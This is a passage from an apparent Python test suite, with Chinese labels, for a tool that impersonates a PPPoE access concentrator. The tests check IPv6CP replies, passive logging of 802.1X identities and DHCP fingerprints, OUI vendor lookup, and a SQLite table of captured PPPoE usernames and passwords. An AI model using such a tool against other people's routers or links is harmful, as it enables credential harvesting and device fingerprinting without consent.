codes = [decode(f)["payload"][0] for f in out]
check("IPv6CP Conf-Req → Ack + 我方 Conf-Req",
      codes[:2] == [2, 1] and all(decode(f)["proto"] == 0x8057 for f in out), "codes=%s" % codes)
check("学到客户端的 Interface-Identifier", S(e, CLI).ipv6_iid == IID, S(e, CLI).ipv6_iid)
mine = decode(out[1])["payload"]
check("我方 Conf-Req 里的 IID 是按 MAC 推导的 EUI-64（本地管理位置位）",
      bytes.fromhex(IID) != mine[6:14] and mine[6] & 0x02 == 0x02, mine.hex())
out.clear()
e.handle_guard(sess(0x8057, "0903000a" + IID))
check("IPv6CP Echo-Req → Echo-Reply", decode(out[0])["payload"][0] == 10)

e2, out2 = mk(ipv6cp="off", learn_ac=False)
e2.handle_guard(disc(0x19, TAGS_PADI))
out2.clear()
e2.handle_guard(sess(0x8057, "0102000e" + "010a" + IID))
check("--ipv6cp off 时不对 IPv6CP 作答", out2 == [])

banner("AD. 802.1X / DHCP 设备指纹（只旁听，不回应）")
e, out = mk(eapol="log", learn_ac=False)
if H.EAPOL is not None and H.EAP is not None:
    eapol = (H.Ether(src=CLI, dst="01:80:c2:00:00:03", type=0x888E) /
             H.EAPOL(type=0) / H.EAP(code=2, id=7, type=1, identity=b"user@isp.com"))
    e.handle_guard(eapol)
    check("抓到 EAP-Response/Identity 并落库",
          any(r.get("eapol_identity") == "user@isp.com" for r in e.events)
          and e.stats["eapol"] >= 1)
    check("身份标签可读", any(r.get("auth") == "EAP-Response/Identity" for r in e.events))
    e.handle_guard(eapol)
    check("同一身份不重复记录", len([r for r in e.events if r.get("kind") == "eapol"]) == 1)
    check("从不回应 802.1X（只记录）", out == [])
else:
    print("  (scapy 缺少 EAP/EAPOL，跳过)")

if H.DHCP is not None:
    dhcp = (H.Ether(src=CLI, dst="ff:ff:ff:ff:ff:ff", type=0x0800) /
            H.IP(src="0.0.0.0", dst="255.255.255.255") /
            H.UDP(sport=68, dport=67) /
            H.BOOTP(op=1, chaddr=bytes.fromhex(hexmac(CLI)) + b"\x00" * 10) /
            H.DHCP(options=[("message-type", "discover"), ("hostname", b"my-router"),
                            ("vendor_class_id", b"HUAWEI"), ("client_id", b"\x01" + bytes.fromhex(hexmac(CLI)))]))
    e2, out2 = mk(dhcp="log", learn_ac=False)
    e2.handle_guard(dhcp)
    rec = [r for r in e2.events if r.get("kind") == "dhcp"]
    check("抓到 DHCP Option 12/60/61（主机名 / 厂商类 / 客户端标识）",
          rec and rec[0]["hostname"] == "my-router" and rec[0]["vendor_class"] == "HUAWEI"
          and rec[0]["client_id"].startswith("01"), rec[0] if rec else "无")
    check("DHCP 只旁听、不回包", out2 == [])
    e3, out3 = mk(dhcp="off", learn_ac=False)
    e3.handle_guard(dhcp)
    check("--dhcp off 时不处理", e3.events == [] and out3 == [])
else:
    print("  (scapy 缺少 DHCP，跳过)")

banner("AE. OUI 厂商识别")
check("华为 OUI 识别", H.oui_vendor("00:e0:fc:11:22:33").startswith("Huawei"))
check("中兴/小米/TP-LINK 都在表里",
      H.oui_vendor("34:e0:cf:00:00:01").startswith("ZTE")
      and H.oui_vendor("64:cc:2e:00:00:01").startswith("Xiaomi")
      and H.oui_vendor("ec:08:6b:00:00:01") == "TP-LINK")
check("未知 OUI 显示 ?", H.oui_vendor("02:00:00:00:00:01") == "?")
oui_file = os.path.join(tmp, "oui.txt")
with open(oui_file, "w", encoding="utf-8") as fh:
    fh.write("# 自定义\n11:22:33,MyONT 自有光猫\n")
tbl = H.load_oui_file(oui_file)
check("--oui-file 可覆盖/补充 OUI 表",
      tbl.get("11:22:33") == "MyONT 自有光猫" and len(tbl) > len(H.OUI_VENDORS) - 1)
e, out = mk(oui_file=oui_file, learn_ac=False)
e.handle_guard(disc(0x19, TAGS_PADI))
check("会话里带上 OUI 厂商", S(e, CLI).vendor == "MyONT 自有光猫", S(e, CLI).vendor)

banner("AF. 老库迁移（v2.0 的 SQLite 表缺列）")
old = os.path.join(tmp, "old.db")
conn = sqlite3.connect(old)
conn.execute("CREATE TABLE creds (id INTEGER PRIMARY KEY AUTOINCREMENT, ts TEXT, mac TEXT, "
             "sessionid TEXT, bras_mac TEXT, ac_name TEXT, auth TEXT, username TEXT, password TEXT)")
conn.execute("INSERT INTO creds (ts, mac, auth, username, password) VALUES ('t','m','pap','u','p')")
conn.commit()
conn.close()
st3 = H.Store(old)
st3.add({"mac": CLI, "auth": "pap", "username": "u2", "password": "p2",
         "vendor": "Huawei 华为", "vlan": "8100/43"})
st3.close()
conn = sqlite3.connect(old)
cols = {r[1] for r in conn.execute("PRAGMA table_info(creds)")}
newrow = conn.execute("SELECT vendor, vlan, kind FROM creds WHERE username='u2'").fetchone()
oldrow = conn.execute("SELECT username FROM creds WHERE ts='t'").fetchone()
conn.close()
check("自动 ALTER TABLE 补齐 v2.1 新列", {"kind", "vendor", "vlan", "eapol_identity"} <= cols)
check("新行写入新列，老数据还在", newrow[0] == "Huawei 华为" and newrow[1] == "8100/43"
      and oldrow[0] == "u")

banner("AG. --profile 预设（legacy / modern / ont）")
pl = H.build_config(["--profile", "legacy"])
pm = H.build_config(["--profile", "modern"])
po = H.build_config(["--profile", "ont"])
check("legacy = 2016 原版：无 VLAN、不旁听、MRU 1480",
      pl.vlan_mode == "off" and pl.eapol == "off" and pl.dhcp == "off"
      and pl.mru == 1480 and pl.ipv6cp_enabled is False)
check("modern：VLAN auto + 双栈 + 指纹记录 + MRU 1492",
      pm.vlan_mode == "auto" and pm.eapol == "log" and pm.dhcp == "log"
      and pm.ipv6cp_enabled is True and pm.mru == 1492)
check("ont：VLAN auto + MRU 1492 + 学真 BRAS 名字",
      po.vlan_mode == "auto" and po.mru == 1492 and po.learn_ac is True)
check("CLI 覆盖 profile（profile 只是起手值）",
      H.build_config(["--profile", "modern", "--mru", "1480", "--vlan", "off"]).mru == 1480
      and H.build_config(["--profile", "modern", "--vlan", "off"]).vlan_mode == "off")
check("未知 profile 报错退出",
      isinstance(_err(lambda: H.build_config(["--profile", "nope"])), SystemExit))

banner("AH. TOML 里的现代设备键")
tpl2 = os.path.join(tmp, "modern.toml")
with open(tpl2, "w", encoding="utf-8") as fh:
    fh.write('[pppoe]\nprofile = "modern"\nvlan = "auto"\nmru = 1492\n'
             'service_name = "a,b"\nmax_payload = 0\neapol = "log"\n')
c = H.build_config(["-c", tpl2])
check("TOML 里的 profile 也生效", c.profile == "modern" and c.vlan_mode == "auto")
check("Service-Name 支持逗号分隔多个", c.service_names == ["a", "b"] and c.service_name == "a")
check("TOML 的 mru/eapol 生效", c.mru == 1492 and c.eapol == "log")

print()
print("=" * 78)
if FAILED:
    print("失败 %d 项: %s" % (len(FAILED), FAILED))
    sys.exit(1)
print("全部离线用例通过。上面的帧都能在装了 Npcap 的真实网卡上原样发出。")
print("=" * 78)
